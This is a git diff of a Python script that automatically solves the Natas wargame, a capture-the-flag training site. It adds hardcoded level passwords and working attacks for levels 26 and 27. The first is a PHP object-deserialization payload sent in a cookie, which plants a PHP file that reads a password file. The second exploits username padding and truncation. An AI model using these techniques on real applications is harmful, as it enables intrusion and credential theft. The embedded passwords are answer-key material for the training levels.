@@ -24,7 +24,9 @@ cred_dict["natas22"] = ("natas22","964laB0r7TuDqJj5b3HFtwsQoc0GhjBF")
 cred_dict["natas23"] = ("natas23","CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5")
 cred_dict["natas24"] = ("natas24","shlL4BvOtawNCd81dwdKRHFzmTEjYYQX")
 cred_dict["natas25"] = ("natas25","UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo")
-
+cred_dict["natas26"] = ("natas26","3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT")
+cred_dict["natas27"] = ("natas27","mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV")
+cred_dict["natas28"] = ("natas28","Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3")
 '''
 # Level 0
 try:
@@ -544,7 +546,8 @@ try:
 
 except requests.exceptions.RequestException as e:
   print(f"HTTP Request failed: {e}")
-'''
+
+
 # Level 24
 try:
   print("\nLevel 24")
@@ -559,6 +562,7 @@ try:
 
 except requests.exceptions.RequestException as e:
   print(f"HTTP Request failed: {e}")
+
 
 # Level 25
 try:
@@ -581,5 +585,65 @@ try:
 
 except requests.exceptions.RequestException as e:
   print(f"HTTP Request failed: {e}")
+
+# PHP Code used to create payload for Natas 26
+#<?php
+#
+#class Logger {
+#    private $logFile;
+#    private $initMsg;
+#    private $exitMsg;
+#    
+#    function __construct(){
+#        $this->initMsg="HackerFrogs";
+#        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
+#        $this->logFile = "/var/www/natas/natas26/img/hackerfrogs.php";
+#    }
+#}
+#
+#$hacker_object = new Logger();
+#echo base64_encode(serialize($hacker_object));
+#
+#?>
+
+# Level 26
+try:
+  print("\nLevel 26")
+  print("Performing insecure deserialization attack")
+  payload = "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MjoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvaGFja2VyZnJvZ3MucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MTE6IkhhY2tlckZyb2dzIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NjI6Ijw/cGhwIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+Ijt9"
+  injection_path = "/img/hackerfrogs.php"
+  cookies = {"drawing":payload}
+  response = requests.post(url_dict["natas26"],auth=cred_dict["natas26"],cookies=cookies)
+  response = requests.post(url_dict["natas26"]+injection_path,auth=cred_dict["natas26"])
+  # Parse the response
+  soup = BeautifulSoup(response.text, "html.parser")
+  text_only = soup.get_text(separator=" ", strip=True)
+  print(text_only)
+  cred_dict["natas27"] = ("natas27",text_only.split()[0])
+
+except requests.exceptions.RequestException as e:
+  print(f"HTTP Request failed: {e}")
+
+
+# Level 27
+try:
+  print("\nLevel 27")
+  print("Performing insecure deserialization attack")
+  target_user = "natas28"
+  padding = " " * (64 - len(target_user))
+  data = {"username":target_user+padding+"x","password":""}
+  response = requests.post(url_dict["natas27"],auth=cred_dict["natas27"],data=data)
+  data = {"username":target_user+padding,"password":""}
+  response = requests.post(url_dict["natas27"],auth=cred_dict["natas27"],data=data)
+  # Parse the response
+  soup = BeautifulSoup(response.text, "html.parser")
+  text_only = soup.get_text(separator=" ", strip=True)
+  cred_dict["natas28"] = ("natas28",text_only.split()[-4])
+
+except requests.exceptions.RequestException as e:
+  print(f"HTTP Request failed: {e}")
+'''
+
+# Level 28
 
 print(cred_dict)
